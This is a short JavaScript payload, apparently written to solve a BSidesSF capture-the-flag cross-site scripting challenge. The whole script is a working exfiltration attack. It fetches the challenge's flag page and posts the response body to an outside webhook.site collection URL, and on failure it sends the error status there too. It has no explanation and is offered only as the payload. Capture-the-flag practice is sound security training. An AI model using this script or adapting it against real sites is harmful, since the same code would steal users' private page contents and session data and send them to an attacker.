var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://web-tutorial-2-9fec29fc.challenges.bsidessf.net/xss-two-flag', true);
xhr.onload = function() {
    fetch('https://webhook.site/09621c79-5ff4-4808-8983-fcbc3a6059db/', {
        method: 'POST',
        mode: 'no-cors',
        body: xhr.responseText
    });
};
xhr.onerror = function() {
    fetch('https://webhook.site/09621c79-5ff4-4808-8983-fcbc3a6059db/?error=' + xhr.status, {
        mode: 'no-cors'
    });
};
xhr.send();
